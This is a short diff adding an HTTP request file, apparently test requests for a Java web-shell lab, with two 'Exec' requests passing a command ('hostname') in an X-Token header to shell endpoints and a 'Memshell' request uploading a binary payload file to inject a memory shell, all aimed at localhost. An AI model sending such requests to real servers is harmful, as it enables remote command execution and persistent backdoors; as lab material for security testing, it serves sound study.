@@ -1,0 +1,32 @@
+###
+# Exec
+POST /WhoopsunixShell HTTP/1.1
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: application/x-www-form-urlencoded
+
+###
+# Exec
+POST /base64 HTTP/1.1
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: application/x-www-form-urlencoded
+
+
+###
+# Memshell
+POST /binary HTTP/1.1
+Host: 127.0.0.1:8080
+X-Token: hostname
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
+
+------WebKitFormBoundary7MA4YWxkTrZu0gW
+Content-Disposition: form-data; name="file"; filename="test.bin"
+Content-Type: application/octet-stream
+
+< cc4.bin
+------WebKitFormBoundary7MA4YWxkTrZu0gW--
+
+
+
+
